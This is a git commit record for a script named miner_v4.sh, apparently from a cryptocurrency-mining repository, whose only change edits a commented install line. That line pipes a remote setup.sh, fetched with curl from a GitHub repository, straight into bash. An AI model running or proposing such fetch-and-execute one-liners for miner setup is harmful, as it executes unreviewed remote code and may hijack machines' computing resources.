aa176de6ffe0f41d6ce6cbd5dfc576237a2aeed6
ĐM <117666678+DucManh206@users.noreply.github.com>
2025-05-11 09:46:30 +0700

    Update miner_v4.sh

--- miner_v4.sh
+++ miner_v4.sh
@@ -1,4 +1,4 @@
-# bash <(curl -sSL https://github.com/DucManh206/xmrst/blob/main/setup.sh)
+# bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/xmrst/refs/heads/main/setup.sh)
 
 
 #!/bin/bash
